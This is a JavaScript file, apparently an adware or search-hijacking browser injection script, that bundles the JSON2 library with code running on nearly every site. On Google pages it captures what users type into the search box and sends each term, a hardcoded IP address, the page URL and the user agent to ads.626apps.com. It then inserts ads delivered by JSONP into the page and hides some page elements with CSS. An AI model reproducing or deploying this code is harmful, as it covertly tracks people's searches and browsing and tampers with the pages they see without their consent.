

var dominUrl=window.location.hostname;
if(dominUrl.indexOf("bing.com")<=0 && dominUrl!='docs.google.com' && dominUrl!='drive.google.com'){

////
// JSON in IE
// JSON2 : https://github.com/douglascrockford/JSON-js/blob/master/json2.js
////

if (typeof JSON !== 'object') {
    JSON = {};
}

(function () {
    'use strict';

    function f(n) {
        // Format integers to have at least two digits.
        return n < 10 ? '0' + n : n;
    }

    if (typeof Date.prototype.toJSON !== 'function') {

        Date.prototype.toJSON = function () {

            return isFinite(this.valueOf())
                ? this.getUTCFullYear()     + '-' 
+                    f(this.getUTCMonth() + 1) + '-' +
                    f(this.getUTCDate())      + 'T' +
                    f(this.getUTCHours())     + ':' +
                    f(this.getUTCMinutes())   + ':' +
                    f(this.getUTCSeconds())   + 'Z'
                : null;
        };

        String.prototype.toJSON      =
            Number.prototype.toJSON  =
            Boolean.prototype.toJSON = function () {
                return this.valueOf();
            };
    }

    var cx = /[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,
        escapable = /[\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,
        gap,
        indent,
        meta = {    // table of character substitutions
            '\b': '\\b',
            '\t': '\\t',
            '\n': '\\n',
            '\f': '\\f',
            '\r': '\\r',
            '"' : '\\"',
            '\\': '\\\\'
        },
        rep;


    function quote(string) {

// If the string contains no control characters, no quote characters, and no
// backslash characters, then we can safely slap some quotes around it.
// Otherwise we must also replace the offending characters with safe escape
// sequences.

        escapable.lastIndex = 0;
        return escapable.test(string) ? '"' + string.replace(escapable, function (a) {
            var c = meta[a];
            return typeof c === 'string'
                ? c
                : '\\u' + ('0000' + a.charCodeAt(0).toString(16)).slice(-4);
        }) + '"' : '"' + string + '"';
    }


    function str(key, holder) {

// Produce a string from holder[key].

        var i,          // The loop counter.
            k,          // The member key.
            v,          // The member value.
            length,
            mind = gap,
            partial,
            value = holder[key];

// If the value has a toJSON method, call it to obtain a replacement value.

        if (value && typeof value === 'object' &&
                typeof value.toJSON === 'function') {
            value = value.toJSON(key);
        }

// If we were called with a replacer function, then call the replacer to
// obtain a replacement value.

        if (typeof rep === 'function') {
            value = rep.call(holder, key, value);
        }

// What happens next depends on the value's type.

        switch (typeof value) {
        case 'string':
            return quote(value);

        case 'number':

// JSON numbers must be finite. Encode non-finite numbers as null.

            return isFinite(value) ? String(value) : 'null';

        case 'boolean':
        case 'null':

// If the value is a boolean or null, convert it to a string. Note:
// typeof null does not produce 'null'. The case is included here in
// the remote chance that this gets fixed someday.

            return String(value);

// If the type is 'object', we might be dealing with an object or an array or
// null.

        case 'object':

// Due to a specification blunder in ECMAScript, typeof null is 'object',
// so watch out for that case.

            if (!value) {
                return 'null';
            }

// Make an array to hold the partial results of stringifying this object value.

            gap += indent;
            partial = [];

// Is the value an array?

            if (Object.prototype.toString.apply(value) === '[object Array]') {

// The value is an array. Stringify every element. Use null as a placeholder
// for non-JSON values.

                length = value.length;
                for (i = 0; i < length; i += 1) {
                    partial[i] = str(i, value) || 'null';
                }

// Join all of the elements together, separated with commas, and wrap them in
// brackets.

                v = partial.length === 0
                    ? '[]'
                    : gap
                    ? '[\n' + gap + partial.join(',\n' + gap) + '\n' + mind + ']'
                    : '[' + partial.join(',') + ']';
                gap = mind;
                return v;
            }

// If the replacer is an array, use it to select the members to be stringified.

            if (rep && typeof rep === 'object') {
                length = rep.length;
                for (i = 0; i < length; i += 1) {
                    if (typeof rep[i] === 'string') {
                        k = rep[i];
                        v = str(k, value);
                        if (v) {
                            partial.push(quote(k) + (gap ? ': ' : ':') + v);
                        }
                    }
                }
            } else {

// Otherwise, iterate through all of the keys in the object.

                for (k in value) {
                    if (Object.prototype.hasOwnProperty.call(value, k)) {
                        v = str(k, value);
                        if (v) {
                            partial.push(quote(k) + (gap ? ': ' : ':') + v);
                        }
                    }
                }
            }

// Join all of the member texts together, separated with commas,
// and wrap them in braces.

            v = partial.length === 0
                ? '{}'
                : gap
                ? '{\n' + gap + partial.join(',\n' + gap) + '\n' + mind + '}'
                : '{' + partial.join(',') + '}';
            gap = mind;
            return v;
        }
    }

// If the JSON object does not yet have a stringify method, give it one.

    if (typeof JSON.stringify !== 'function') {
        JSON.stringify = function (value, replacer, space) {

// The stringify method takes a value and an optional replacer, and an optional
// space parameter, and returns a JSON text. The replacer can be a function
// that can replace values, or an array of strings that will select the keys.
// A default replacer method can be provided. Use of the space parameter can
// produce text that is more easily readable.

            var i;
            gap = '';
            indent = '';

// If the space parameter is a number, make an indent string containing that
// many spaces.

            if (typeof space === 'number') {
                for (i = 0; i < space; i += 1) {
                    indent += ' ';
                }

// If the space parameter is a string, it will be used as the indent string.

            } else if (typeof space === 'string') {
                indent = space;
            }

// If there is a replacer, it must be a function or an array.
// Otherwise, throw an error.

            rep = replacer;
            if (replacer && typeof replacer !== 'function' &&
                    (typeof replacer !== 'object' ||
                    typeof replacer.length !== 'number')) {
                throw new Error('JSON.stringify');
            }

// Make a fake root object containing our value under the key of ''.
// Return the result of stringifying the value.

            return str('', {'': value});
        };
    }


// If the JSON object does not yet have a parse method, give it one.

    if (typeof JSON.parse !== 'function') {
        JSON.parse = function (text, reviver) {

// The parse method takes a text and an optional reviver function, and returns
// a JavaScript value if the text is a valid JSON text.

            var j;

            function walk(holder, key) {

// The walk method is used to recursively walk the resulting structure so
// that modifications can be made.

                var k, v, value = holder[key];
                if (value && typeof value === 'object') {
                    for (k in value) {
                        if (Object.prototype.hasOwnProperty.call(value, k)) {
                            v = walk(value, k);
                            if (v !== undefined) {
                                value[k] = v;
                            } else {
                                delete value[k];
                            }
                        }
                    }
                }
                return reviver.call(holder, key, value);
            }


// Parsing happens in four stages. In the first stage, we replace certain
// Unicode characters with escape sequences. JavaScript handles many characters
// incorrectly, either silently deleting them, or treating them as line endings.

            text = String(text);
            cx.lastIndex = 0;
            if (cx.test(text)) {
                text = text.replace(cx, function (a) {
                    return '\\u' +
                        ('0000' + a.charCodeAt(0).toString(16)).slice(-4);
                });
            }

// In the second stage, we run the text against regular expressions that look
// for non-JSON patterns. We are especially concerned with '()' and 'new'
// because they can cause invocation, and '=' because it can cause mutation.
// But just to be safe, we want to reject all unexpected forms.

// We split the second stage into 4 regexp operations in order to work around
// crippling inefficiencies in IE's and Safari's regexp engines. First we
// replace the JSON backslash pairs with '@' (a non-JSON character). Second, we
// replace all simple value tokens with ']' characters. Third, we delete all
// open brackets that follow a colon or comma or that begin the text. Finally,
// we look to see that the remaining characters are only whitespace or ']' or
// ',' or ':' or '{' or '}'. If that is so, then the text is safe for eval.

            if (/^[\],:{}\s]*$/
                    .test(text.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g, '@')
                        .replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g, ']')
                        .replace(/(?:^|:|,)(?:\s*\[)+/g, ''))) {

// In the third stage we use the eval function to compile the text into a
// JavaScript structure. The '{' operator is subject to a syntactic ambiguity
// in JavaScript: it can begin a block or an object literal. We wrap the text
// in parens to eliminate the ambiguity.

                j = eval('(' + text + ')');

// In the optional fourth stage, we recursively walk the new structure, passing
// each name/value pair to a reviver function for possible transformation.

                return typeof reviver === 'function'
                    ? walk({'': j}, '')
                    : j;
            }

// If the text is not JSON parseable, then a SyntaxError is thrown.

            throw new SyntaxError('JSON.parse');
        };
    }
}());









/////
// NICA Code begins here
/////




////////////////////
//// START BIND

function bindReady(handler){

	var called = false

	function ready() { 
		if (called) return
		called = true
		handler()
	}

	if ( document.addEventListener ) { // native event
		document.addEventListener( "DOMContentLoaded", ready, false )
	} else if ( document.attachEvent ) {  // IE

		try {
			var isFrame = window.frameElement != null
		} catch(e) {}

		// IE, the document is not inside a frame
		if ( document.documentElement.doScroll && !isFrame ) {
			function tryScroll(){
				if (called) return
				try {
					document.documentElement.doScroll("left")
					ready()
				} catch(e) {
					setTimeout(tryScroll, 10)
				}
			}
			tryScroll()
		}

		// IE, the document is inside a frame
		document.attachEvent("onreadystatechange", function(){
			if ( document.readyState === "complete" ) {
				ready()
			}
		})
	}

	// Old browsers
    if (window.addEventListener)
        window.addEventListener('load', ready, false)
    else if (window.attachEvent)
        window.attachEvent('onload', ready)
    else {
		var fn = window.onload // very old browser, copy old onload
		window.onload = function() { // replace by new onload and call the old one
			fn && fn()
			ready()
		}
    }
}

//// END BIND
////////////////////

////////////////////
//// start onReady

var readyList = []

function onReady(handler) {
	
	function executeHandlers() {
		for(var i=0; i<readyList.length; i++) {
			readyList[i]()
		}
	}

	if (!readyList.length) { // set handler on first run 
		bindReady(executeHandlers)
	}

	readyList.push(handler)
}

//// END onReeady
////////////////////




	function getHashValue(key) {
		var match = location.hash  .match(new RegExp(key + '=([^&]*)'));
		return match ? match[1] : "";
	}

	Element.prototype.remove = function() {
		this.parentElement.removeChild(this);
	}
	NodeList.prototype.remove = HTMLCollection.prototype.remove = function() {
		for(var i = 0, len = this.length; i < len; i++) {
			if(this[i] && this[i].parentElement) {
				this[i].parentElement.removeChild(this[i]);
			}
		}
	}
	
	
	//if user is at Google
	if(window.location.host.indexOf("google") !== -1 )
		{
		
	 	var blockUrl = location.pathname;
                if(blockUrl!='/calendar/render'){
	
		var userIp = "14.139.160.6";
		var userCountryCode = "IN";
		var confObj = null;
		var CRPName = "Sense";
		var ref1 ="63726f73737269646572";
		var ref2 ="200079910300000000";
		var ref3 ="7A8B73C9EA1E48D5BE8497CA85A0E053IE";
		var rc = "3";
		var configUrl = '//ads.626apps.com/c.php?q='+document.getElementById("gbqfq").value+'&s='+window.location.hostname+'&callback=configCallback';
		//console.log(getHashValue("q"));
			var mst = "";
			
			function attachTextListener(input, func) {
			  if (window.addEventListener) {
				input.addEventListener('input', func, false);
			  } else
				input.attachEvent('onpropertychange', function() {
				  func.call(input);
				});	 
			}

			var myInput = document.getElementById('gbqfq');
			attachTextListener(myInput, function() {
			  // Check and manipulate this.value here
			  mst =  document.getElementById('gbqfq').value;
			});
			
			function addEvent(element, evnt, funct){
			  if (element.attachEvent)
			   return element.attachEvent('on'+evnt, funct);
			  else
			   return element.addEventListener(evnt, funct, false);
			}
			
			addEvent(
			document.getElementById('gbqfb'),
			'click',
			function () {  secondarySearch(document.getElementById('gbqfb').value); }
			);
			  
			var nn=(document.layers)?true:false;
			var ie=(document.all)?true:false;
		        function  getObjsByClass (param) {
                                var tags = tags || document.getElementsByTagName("*");
                                var list = [];
                                for( var k in tags){
                                        var tag = tags[k];
                                        if(tag.className == param) {
                                                tag.id=k;

                                         document.getElementById(k).setAttribute("onclick","secondarySearch();");
                                        }
                                }
                        }	
			document.getElementById('gbqfq').onkeydown=function keyDown(e) 
				{
				  getObjsByClass('gssb_a gbqfsf');
				  var evt=(e)?e:(window.event)?window.event:null;
				  if(evt)
					{
						//console.log("evt: "+evt);
						
						var key=(evt.charCode)?evt.charCode:((evt.keyCode)?evt.keyCode:((evt.which)?evt.which:0));
						if(key == "13")
							{
								console.log("mst : "+mst);
								secondarySearch();
							}
					 }
				};
			if(nn) document.captureEvents(Event.KEYDOWN);	
			
			
			

			
			
	
			function secondarySearch(vari)
				{
					//console.log("secondarySearch"+vari);
					var elementExists = function(element) 
						{
							while (element) {
								if (element == document) {
									return true;
								}
								element = element.parentNode;
							}
							return false;
						}

					var gserp = document.getElementById("g-serp");
					//console.log(elementExists(gserp)); // true
					if (elementExists(gserp)){ gserp.parentNode.removeChild(gserp)};
					//console.log(elementExists(gserp)); // false
					  
					var searchterma = document.getElementById('gbqfq').value;
					if(searchterma==''){
                                                searchterma=getGoogleKeyword('q');
                                        }
					
					console.log("value to pass to d.php:"+searchterma);
										
					var script = document.createElement('script');
					script.src = "//ads.626apps.com/d.php?cc=IN&user_ip=14.139.160.6&626ref2="+ref2+"&626Name="+CRPName+"&626ref3="+ref3+"&626ref1=63726f73737269646572&key="+encodeURIComponent(searchterma);
						document.getElementsByTagName('head')[0].appendChild(script);
				
				}
				function getGoogleKeyword(paras) {
					var url = location.href;
					//console.log("["+url+"]");
						var paraString = url.substring(url.indexOf("?") + 1, url.length).split("&");
						var paraObj = {}
						for (i = 0; j = paraString[i]; i++) {
							paraObj[j.substring(0, j.indexOf("=")).toLowerCase()] = j.substring(j.indexOf("=") + 1, j.length);
						}
						var returnValue = paraObj[paras.toLowerCase()];
						if (typeof (returnValue) == "undefined") {
					var url=location.hash.replace("#","?");
					//console.log(url);
							var paraString=url.substring(url.indexOf("?") + 1, url.length).split("&");
					var keyObj={}
					for (i = 0; j = paraString[i]; i++) {
							 keyObj[j.substring(0, j.indexOf("=")).toLowerCase()] = j.substring(j.indexOf("=") + 1, j.length);
						}
					return keyObj[paras.toLowerCase()];
					} else {
							return returnValue;
						}
				}
				searchterma=getGoogleKeyword('q');
		
				if(searchterma){
						secondarySearch(searchterma);
				}

				
		    }
		}		
			  
			   
	   
			   
			   
			   


//if user is not at google 
if(window.location.host.indexOf("google") == -1 && window.location.host.indexOf("baidu") == -1)
	{
			
		var configUrl = '//ads.626apps.com/c.php?s='+window.location.hostname+'&callback=configCallback';
		//console.error(configUrl);
		
		var userIp = "14.139.160.6";
		var userCountryCode = "IN";
		var confObj = null;
		var CRPName = "Sense";
		var ref1 ="63726f73737269646572";
		var ref2 ="200079910300000000";
		var ref3 ="7A8B73C9EA1E48D5BE8497CA85A0E053IE";
		var rc = "3";
		


/**
 * Callback when search is complete
 * 
 * @param  {[type]} results
 * @return {[type]}
 */

 
function searchCallback(results) {
    if(!results.Message) {
        console.error('Invalid  API response. No Messages found');
    }
	renderResults(confObj, results);
}

/**
 * Invoked when the config is called
 * 
 * @return {[type]}
 */
function configCallback(conf) {
    confObj = conf; // Global
    var feedUrl = confObj.feedurl;
    var bqs = buildQueryString(confObj);
    if(bqs==null){return;}
    var queryString = bqs + '&callback=searchCallback';
    // Now we include the JSONP script for the API
    var script = document.createElement('script');
    script.src = feedUrl + '?' + queryString;

    document.getElementsByTagName('head')[0].appendChild(script);
}


// Include the config into the page. This is JSONP and will invoke configCallback
var script = document.createElement('script');
script.src = configUrl;

document.getElementsByTagName('head')[0].appendChild(script);

/**
 * Ajax calls
 *
 * @link http://www.hunlock.com/blogs/The_Ultimate_Ajax_Object
 * @param  {[type]} url
 * @param  {[type]} callbackFunction
 * @return {[type]}
 */
function ajaxObject(url, callbackFunction) {

  var that=this;      
  this.updating = false;
  this.abort = function() {
    if (that.updating) {
      that.updating=false;
      that.AJAX.abort();
      that.AJAX=null;
    }
  }
  this.update = function(passData,postMethod) { 
    if (that.updating) { return false; }
    that.AJAX = null;                          
    if (window.XMLHttpRequest) {              
      that.AJAX=new XMLHttpRequest();              
    } else {                                  
      that.AJAX=new ActiveXObject("Microsoft.XMLHTTP");
    }                                             
    if (that.AJAX==null) {                             
      return false;                               
    } else {
      that.AJAX.onreadystatechange = function() {  
        if (that.AJAX.readyState==4) {             
          that.updating=false;                
          that.callback(that.AJAX.responseText,that.AJAX.status,that.AJAX.responseXML);        
          that.AJAX=null;                                         
        }                                                      
      }                                                        
      that.updating = new Date();                              
      if (/post/i.test(postMethod)) {
        var uri=urlCall+'?'+that.updating.getTime();
        that.AJAX.open("POST", uri, true);
        that.AJAX.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        that.AJAX.setRequestHeader("Content-Length", passData.length);
        that.AJAX.send(passData);
      } else {
        var uri=urlCall+'?'+passData+'&timestamp='+(that.updating.getTime()); 
        that.AJAX.open("GET", uri, true);                             
        that.AJAX.send(null);                                         
      }              
      return true;                                             
    }                                                                           
  }
  var urlCall = url;        
  this.callback = callbackFunction || function () { };
}

/**
 * http://stackoverflow.com/a/901144/1240134
 */
	function getParameterByName(name) {
		name = name.replace(/[\[]/, "\\\[").replace(/[\]]/, "\\\]");
		var regex = new RegExp("[\\?&]" + name + "=([^&#]*)"),
		results= "";
		results = regex.exec(location.search);
		if(results){ return results == null ? "" : decodeURIComponent(results[1].replace(/\+/g, " ").trim());}
		else{
		
			if(window.location.hash) {
				var domain = window.location.host; 
				if(domain.indexOf("google") !== -1 )
					{
					console.log("search value : "+document.getElementById("gbqfq").value);
					return results = document.getElementById("gbqfq").value;	
				}
			}
			 return ;
			//return results = document.getElementById("gbqfq").value;
			// results = document.getElementById("gbqfq").value;
		}
		 
		//console.log(results); 
	}   



/**
 * Build the query string
 * 
 * @param  {[type]} confObject
 * @return {[type]}
 */
 
	function buildQueryString(confObject) {

			
		if(rc==""){ rc = "3";}
		//if(userCountryCode==""){userCountryCode = "us";}
		var pName=getParameterByName(confObject.searchterm);	
		if(pName==null || pName=="" ){return; }
		var queryString = 
			'key=' + encodeURIComponent(pName.trim()) +
			'&user_ip=' + encodeURIComponent(userIp) + 
			'&page_url=' + encodeURIComponent(document.URL) + 
			'&user_agent=' + encodeURIComponent(navigator.userAgent) + 
			'&cc=' + userCountryCode +    
			'&ref1=' + ref1 +
			'&ref2=' + ref2 +
			'&ref3=' + ref3 +
			'&rc='+rc;
		//console.log( "queryTerm : "+encodeURIComponent(getParameterByName(confObject.searchterm).trim()) );
		return queryString;

	}


/**
 * Simple parser to take a template and replace placeholders with
 * actual data
 */
	var ConfigParser = function() 
		{

			this.commonParse = function(template, data) {
				for(var i in data) {
					var re = new RegExp('{%' + i.toUpperCase() + '%}', 'gi');
					template = template.replace(re, data[i]);
				}
				
			   var re = /\{\^(.*?)\^\}/gi;
					var found = template.match(re);

				for(i in found) {

					var varName = found[i].replace('{^', '');
					varName = varName.replace('^}', '');
					var value = window[varName];
					template = template.replace('{^' + varName + '^}', value);
				}
				return template;
			}

			
			this.parseTemplate = function(template, data) {
			
				template = this.commonParse(template, data);
				return template;
			}
						
					
		} //End of ConfigParser

	/**
	 * Render the result set
	 * 
	 * @param  {[type]} confObject
	 * @param  {[type]} results
	 * @return {[type]}
	 */

	function renderResults(confObject, results) {


		var containerId = confObject.adcontainer_id;
		var container = document.getElementById(containerId);
		var html = '';
		var ads = '';

		if (!container){
			console.error('Unable to find container id \'' + containerId+ '\'');
			return;
		}

		var parser = new ConfigParser(confObject);
		var queryTerm = getParameterByName(confObject.searchterm);
		
		if(!queryTerm) {
			console.log('Empty searchterm in parameter ' + confObject.searchterm);
		}
		var domain = window.location.host; 
		if(domain.indexOf("google") !== -1 )
			{
				document.getElementById('gbqfb').onclick = function(event)
				{
					console.log("Search Clicked!" + document.getElementById("gbqfq").value);
					queryTerm = document.getElementById("gbqfq").value;
				}
			// neeed to add search results for suggested results
			}

		for(var i in results.Message) {
			ads += parser.parseTemplate(confObject.ad.template, results.Message[i]);
		}
		
		html += parser.parseTemplate( confObject.ad.wrapper, 	{ ads: ads,	searchterm: queryTerm },   queryTerm );
											  
		container.innerHTML = html + container.innerHTML;
		
	}
 
  
	/**
	 * Load the config from the provided URL
	 * 
	 * @param  {[type]}   configUrl
	 * @param  {Function} cb
	 * @return {[type]}
	 */
	function mbLoadConfig(configUrl, cb) {
		mbGetJSON(configUrl, function(data) {
			cb(data);
		});
	}

	/**
	 * Get the JSON response from the endpoint
	 * 
	 * @param  {Function} cb
	 * @return {[type]}
	 */
	function mbGetResponse(endpoint, paramString, cb) {
		var ajax = new ajaxObject(endpoint, function(data, status) {
			var obj = JSON.parse(data);
			cb(obj);
		});
		ajax.update(paramString);
	}

	/**
	 * Wrapper for ajaxObject
	 * 
	 * @param  {[type]}   url
	 * @param  {Function} cb
	 * @return {[type]}
	 */
	function mbGetJSON(url, cb) {
		var ajax = new ajaxObject(url, function(data, status) {
			var obj = JSON.parse(data);
			cb(obj);
		});
		ajax.update();
	}


	
			
	function  ttis(id){e=document.getElementById(id);if(e.style.display=="none"){e.style.display="";e=document.getElementById(id);ttic(id)}}function ttic(id){setTimeout(function(){e.style.display="none"},3000)};
	function addCss(cssCode) {var styleElement = document.createElement("style");  styleElement.type = "text/css";  if (styleElement.styleSheet) {    styleElement.styleSheet.cssText = cssCode;  } else {    styleElement.appendChild(document.createTextNode(cssCode));  }  document.getElementsByTagName("head")[0].appendChild(styleElement);}
	onReady(function(){ addCss ("	#er-wrap{display:none;visibility: hidden} #abc center{display:none;visibility: hidden}")});
	addCss (" #abc center{display:none;visibility: hidden}#abb center{display:none;visibility: hidden} #er-wrap{display:none;visibility: hidden} div.tooltip{outline:0}		div.tooltip strong{line-height:30px}		div.tooltip{text-decoration:none}		div.tooltip span{z-index:10;display:none;padding:14px 20px;margin-top:10px;margin-left:100px;width:300px;line-height:16px}		.tooltip div{font-size:small;font-family:arial,sans-serif}		div.tooltip span{display:inline;position:absolute;color:#666;border:1px solid #DCA;background:#fff;font-size:small;arial,sans-serif}		.callout{z-index:20;position:absolute;top:10px;border:0;top:-11px}		#sdyt{margin-bottom:5px}		div.tooltip span{border-radius:1px;-moz-border-radius:1px;-webkit-border-radius:1px;-moz-box-shadow:0 0 10px #CCC;-webkit-box-shadow:0 0 10px #CCC;box-shadow:0 0 10px #CCC");		
	}
	 
}
